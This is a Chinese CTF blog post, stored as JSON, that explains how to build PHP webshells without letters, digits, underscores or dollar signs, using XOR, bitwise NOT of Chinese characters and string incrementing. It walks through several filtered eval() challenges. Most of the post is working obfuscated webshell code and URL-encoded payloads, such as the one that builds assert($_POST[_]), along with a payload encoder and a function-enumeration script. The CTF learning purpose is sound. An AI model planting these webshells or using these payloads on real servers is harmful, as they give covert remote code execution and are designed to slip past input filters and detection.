{"title":"特殊的webshell","slug":"特殊的webshell","date":"2019-09-27T03:26:55.000Z","updated":"2020-05-09T10:22:00.030Z","comments":true,"path":"api/articles/特殊的webshell.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"特殊的webshell\"><a href=\"#特殊的webshell\" class=\"headerlink\" title=\"特殊的webshell\"></a>特殊的webshell</h1><p>实验环境 ：<code>php 5.45+nts+apache</code></p>\n<blockquote>\n<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p>\n<p>但 php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p>\n</blockquote>\n<h2 id=\"不包含数字字母\"><a href=\"#不包含数字字母\" class=\"headerlink\" title=\"不包含数字字母\"></a>不包含数字字母</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/[a-z0-9]/is'</span>,$_GET[<span class=\"string\">'shell'</span>])) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'shell'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"异或\"><a href=\"#异或\" class=\"headerlink\" title=\"异或\"></a>异或</h3><p>异或是对字符的 <code>ascii</code>码进行逐位异或以后得到一个异或结果<code>ascii</code>码的字符。</p>\n<p>第一种方法就是这样来绕过数字字母的检测。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a=urldecode(<span class=\"string\">'%01'</span>); <span class=\"comment\">//ascii 0x01</span></span><br><span class=\"line\">$b=urldecode(<span class=\"string\">'`'</span>);   <span class=\"comment\">//ascii 96</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a^$b;\t\t\t <span class=\"comment\">//a</span></span><br><span class=\"line\"><span class=\"number\">96</span>:  <span class=\"number\">0110</span> <span class=\"number\">0000</span></span><br><span class=\"line\">%<span class=\"number\">01</span>: <span class=\"number\">0000</span> <span class=\"number\">0001</span>\t\t <span class=\"comment\">//相当于ascii+1</span></span><br></pre></td></tr></table></figure>\n\n<p>我们统一选取  ‘`’  作为我们异或的起点，因为他的 ascii 是96。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_=(<span class=\"string\">'%01'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%13'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%13'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%05'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%12'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%14'</span>^<span class=\"string\">'`'</span>);</span><br><span class=\"line\">$__=<span class=\"string\">'_'</span>.(<span class=\"string\">'%0D'</span>^<span class=\"string\">']'</span>).(<span class=\"string\">'%2F'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%0E'</span>^<span class=\"string\">']'</span>).(<span class=\"string\">'%09'</span>^<span class=\"string\">']'</span>); <span class=\"comment\">// $__='_POST';</span></span><br><span class=\"line\">$___=$$__;</span><br><span class=\"line\">$_($___[_]); <span class=\"comment\">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>\n\n<p>在如下过滤中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/[a-z0-9]/is'</span>,$_GET[<span class=\"string\">'shell'</span>])) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'shell'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们 <code>POST : _=phpinfo();</code> 即可成功执行</p>\n<h3 id=\"取反\"><a href=\"#取反\" class=\"headerlink\" title=\"取反\"></a>取反</h3><p>通过取反将汉字编码中的编码取出来进行取反</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> ((<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)+(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)).<span class=\"string\">' '</span>;<span class=\"comment\">//利用弱类型的特性</span></span><br><span class=\"line\">$__=(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)+(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>);</span><br><span class=\"line\">$_=$__/$__;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $_;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> ~(<span class=\"string\">'和'</span>&#123;<span class=\"number\">2</span>&#125;);\t          <span class=\"comment\">//s</span></span><br></pre></td></tr></table></figure>\n\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$__=(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)+(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>); <span class=\"comment\">//2</span></span><br><span class=\"line\">$_=$__/$__; <span class=\"comment\">//1</span></span><br><span class=\"line\"></span><br><span class=\"line\">$____=<span class=\"string\">''</span>; <span class=\"comment\">//assert</span></span><br><span class=\"line\">$___=<span class=\"string\">\"瞰\"</span>;$____.=~($___&#123;$_&#125;); <span class=\"keyword\">echo</span> $____.<span class=\"string\">\"\\r\\n\"</span>;<span class=\"comment\">//a</span></span><br><span class=\"line\">$___=<span class=\"string\">\"和\"</span>;$____.=~($___&#123;$__&#125;); <span class=\"keyword\">echo</span> $____.<span class=\"string\">\"\\r\\n\"</span>; <span class=\"comment\">//s</span></span><br><span class=\"line\">$___=<span class=\"string\">\"和\"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"的\"</span>;$____.=~($___&#123;$_&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"半\"</span>;$____.=~($___&#123;$_&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"始\"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">$_____=<span class=\"string\">'_'</span>;<span class=\"comment\">//_POST</span></span><br><span class=\"line\">$___=<span class=\"string\">\"俯\"</span>;$_____.=~($___&#123;$__&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"瞰\"</span>;$_____.=~($___&#123;$__&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"次\"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"站\"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$_=$$_____; <span class=\"comment\">//$_POSTT</span></span><br><span class=\"line\"></span><br><span class=\"line\">$____($_[$__]);<span class=\"comment\">//assert(_POST[2])</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"字符递增\"><a href=\"#字符递增\" class=\"headerlink\" title=\"字符递增\"></a>字符递增</h3><blockquote>\n<p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 $a = ‘Z’; $a++; 将把 $a 变成’AA’，而在 C 中，a = ‘Z’; a++; 将把 a 变成 ‘[‘（’Z’ 的 ASCII 值是 90，’[‘ 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。 </p>\n</blockquote>\n<pre><code>echo &quot;&lt;h3&gt;Postincrement&lt;/h3&gt;&quot;;\n$a = 5;\necho &quot;Should be 5: &quot; . $a++ . &quot;&lt;br /&gt;\\n&quot;; //5\necho &quot;Should be 6: &quot; . $a . &quot;&lt;br /&gt;\\n&quot;;   //6\n$c = &apos;b&apos;;\necho $c++.&quot;&lt;br /&gt;\\n&quot;;                     //b\necho $c.&quot;\\n&quot;;                               //c\n?&gt;</code></pre><p>我们只要拿到一个变量值为 <code>a</code> ，通过自增操作就可以获得 <code>a-z</code> 中所有字符。</p>\n<p>php中如果强制链接数组和字符串的话，数组会被转换成字符串，值为 <code>Arrary</code> </p>\n<pre><code>echo &apos;&apos;.[];   //Array</code></pre><p>我们取第一个字符就可以得到 <code>A</code> 了。</p>\n<p>payload:</p>\n<pre><code>&lt;?php\n$_=[];\n$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;\n$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____=&apos;_&apos;;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);</code></pre><p>但是一直没有成功</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = <span class=\"string\">'$_=[];$_=@\"$_\";'</span></span><br><span class=\"line\">b = <span class=\"string\">\"$_=$_['!'=='@'];\"</span></span><br><span class=\"line\">c = <span class=\"string\">'$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class=\"line\">d = <span class=\"string\">'$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;'</span></span><br><span class=\"line\">e = <span class=\"string\">'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class=\"line\">f = <span class=\"string\">'$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class=\"line\">g = <span class=\"string\">\"$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;\"</span></span><br><span class=\"line\">h = <span class=\"string\">'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_=$$____;$___($_[_]);'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> (a+b+c+d+e+f+g+h).replace(<span class=\"string\">\"$\"</span>,<span class=\"string\">\"%24\"</span>).replace(<span class=\"string\">\"=\"</span>,<span class=\"string\">\"%3d\"</span>).replace(<span class=\"string\">\";\"</span>,<span class=\"string\">\"%3b\"</span>).replace(<span class=\"string\">\"@\"</span>,<span class=\"string\">\"%40\"</span>).replace(<span class=\"string\">\"+\"</span>,<span class=\"string\">\"%20\"</span>).replace(<span class=\"string\">\"[\"</span>,<span class=\"string\">\"%5b\"</span>).replace(<span class=\"string\">\"]\"</span>,<span class=\"string\">\"%5d\"</span>).replace(<span class=\"string\">\"'\"</span>,<span class=\"string\">\"%27\"</span>).replace(<span class=\"string\">'\"'</span>,<span class=\"string\">\"%22\"</span>).replace(<span class=\"string\">\"!\"</span>,<span class=\"string\">\"%21\"</span>).replace(<span class=\"string\">\"(\"</span>,<span class=\"string\">\"%28\"</span>).replace(<span class=\"string\">\")\"</span>,<span class=\"string\">\"%29\"</span>).replace(<span class=\"string\">\".\"</span>,<span class=\"string\">'%2e'</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"限制长度\"><a href=\"#限制长度\" class=\"headerlink\" title=\"限制长度\"></a>限制长度</h2><p>PHP可以将字符串当作函数来处理：</p>\n<pre><code>function B()\n{\n    echo &quot;hello world!&quot;;\n}\n\n$_++;           //1\necho $_;\n$__ = &apos;?&apos;^&apos;}&apos;; //B\necho $__;\n$__();</code></pre><p>题目：</p>\n<pre><code>&lt;?php\ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;40){\n        die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>限制长度为40，之前的异或不行了。我们要利用PHP允许动态执行函数的特点，构造一个 <code>_GET</code> 来去读取 <code>getFlag()</code> </p>\n<p>可以通过连续调用异或来获得 <code>_GET</code> </p>\n<pre><code>&lt;?php\n    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET\n?&gt;</code></pre><p>通过构造 <code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code> 来获取参数</p>\n<p>最后传入参数 getFlag</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag </code></pre><p>后面的 <code>__</code> 我们不传值默认为 <code>NULL</code> 也就相当于 <code>getFlag()</code></p>\n<p>事实上下面这也可以：</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_]();&amp;_=getFlag</code></pre><h3 id=\"扩展\"><a href=\"#扩展\" class=\"headerlink\" title=\"扩展\"></a>扩展</h3><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</code></pre><p>对 <code>getFlag</code> 进行取反然后 <code>URL</code> 编码</p>\n<pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>这个在{}中进行取反 <code>${~&quot;\\xa0\\xb8\\xba\\xab&quot;}</code> ，相当于 <code>$_GET</code>，拼接出了 <code>$_GET[&#39;+&#39;]&amp;#40; &amp;#41;;</code>，传入 <code>+=getFlag()</code> 从而执行了函数`</p>\n<h2 id=\"不用数字字母和下划线\"><a href=\"#不用数字字母和下划线\" class=\"headerlink\" title=\"不用数字字母和下划线\"></a>不用数字字母和下划线</h2><p>题目：</p>\n<pre><code>&lt;?php\n\ninclude &apos;flag.php&apos;;\n\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;50){\n        die(&quot;Too Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){\n        die(&quot;Not Allowed.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;  </code></pre><p>通过上面的取反就可以了</p>\n<pre><code>?code=$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;[%27%2d%27]();&amp;%2d=getFlag //$_GET(&apos;-&apos;)();&amp;-=getFlag;\n\n$c = &quot;_GET&quot;;\necho urlencode(~($c)); //%A0%B8%BA%AB</code></pre><p>这里利用 <code>${}</code> 中的代码可以执行的特点，在 <code>{}</code> 里进行取反操作，其实也就是可变变量</p>\n<pre><code>&lt;?php\n    $a = &apos;hello&apos;;\n    $$a = &apos;world&apos;;\n    echo &quot;$a ${$a}&quot;;\n?&gt;\n\n输出：hello world</code></pre><p>这里的 <code>$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;</code> 相当于 <code>$_GET</code> .</p>\n<p>还有更骚的，用中文：</p>\n<pre><code>code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();  //%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27=getFlag</code></pre><p>相当于直接给变量赋值了，这样就不用 <code>{}</code> 了</p>\n<h2 id=\"不用数字、字母、-、\"><a href=\"#不用数字、字母、-、\" class=\"headerlink\" title=\"不用数字、字母、_、$\"></a>不用数字、字母、_、$</h2><pre><code>&lt;?php \ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;]))\n{\n    $code=$_GET[&apos;code&apos;];\n    if(strlen($code)&gt;35){\n    die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))\n    {\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}\nelse\n{\n    highlight_file(__FILE__);\n}\n//$hint=&quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p>\n<p><code>?&gt;</code> 闭合php文件开头的 <code>&lt;?php</code> , <code>&lt;?</code> 相当于 <code>&lt;? echo</code> .</p>\n<p>在配置文件中开启 <code>short_open_tag</code> 后可以使用短标签。默认是开启的。</p>\n<h2 id=\"another-test\"><a href=\"#another-test\" class=\"headerlink\" title=\"another test\"></a>another test</h2><pre><code>&lt;?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET[&apos;_&apos;];\nif ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $_) )\n    die(&apos;rosé will not do it&apos;);\n\nif ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )\n    die(&apos;you are so close, omg&apos;);\n\neval($_);\n?&gt;</code></pre><p>主要是记录一下大佬的检测可用函数的脚本：</p>\n<pre><code>&lt;?php \n$arr = get_defined_functions()[&apos;internal&apos;];\n\nforeach ($arr as $key =&gt; $value) {\n    if ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $value) ){\n        unset($arr[$key]);\n        continue;\n    }\n\n    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){\n        unset($arr[$key]);\n        continue;\n    }\n}\n\nvar_dump($arr);\n?&gt;</code></pre><h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>\n<p><a href=\"https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/\" target=\"_blank\" rel=\"noopener\">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5677#toc-3\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5677#toc-3</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]}